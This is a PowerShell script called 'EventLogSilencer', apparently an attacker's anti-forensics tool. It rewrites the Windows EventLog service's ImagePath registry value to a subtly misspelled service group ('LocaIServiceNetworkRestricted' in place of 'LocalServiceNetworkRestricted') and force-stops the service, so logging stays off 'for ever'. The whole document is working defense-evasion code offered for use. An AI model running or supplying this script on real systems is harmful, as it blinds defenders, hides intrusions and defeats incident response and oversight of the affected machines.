# Event Log registry path variables
$registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog"
$keyName = "ImagePath"
$newValue = "%SystemRoot%\System32\svchost.exe -k LocaIServiceNetworkRestricted -p"
#Default %SystemRoot%\System32\svchost.exe -k LocalServiceNetworkRestricted -p
$serviceName = "eventlog"
# Function to write colored text
function Write-ColoredText {
    param (
        [string]$text,
        [string]$color
    )
    Write-Host $text -ForegroundColor $color
}
Write-Host @"
*********************************************************************
*                      EventLogSilencer                             *
*********************************************************************
*                  Silence Windows Event Logging                    *
*                                                                   *
*********************************************************************
"@ -ForegroundColor Yellow


Write-ColoredText "[+] Finding Registry Path Of EventLog" "Yellow"

if (Test-Path -Path $registryPath) {
    # Set the registry key value
    Write-ColoredText "[+] Change Registry Path Of EventLog" "Yellow"
    Set-ItemProperty -Path "$registryPath" -Name "$keyName" -Value "$newValue"
    Write-ColoredText "[+] Stopping Event Log For Ever" "Yellow"
    Stop-Service -Name $serviceName -Force

    Write-ColoredText "[+] Boom! Now EventLog Is Down :)" "Green"
} else {
    Write-ColoredText "[-] Registry Path Of EventLog Not Found :(" "Red"
}
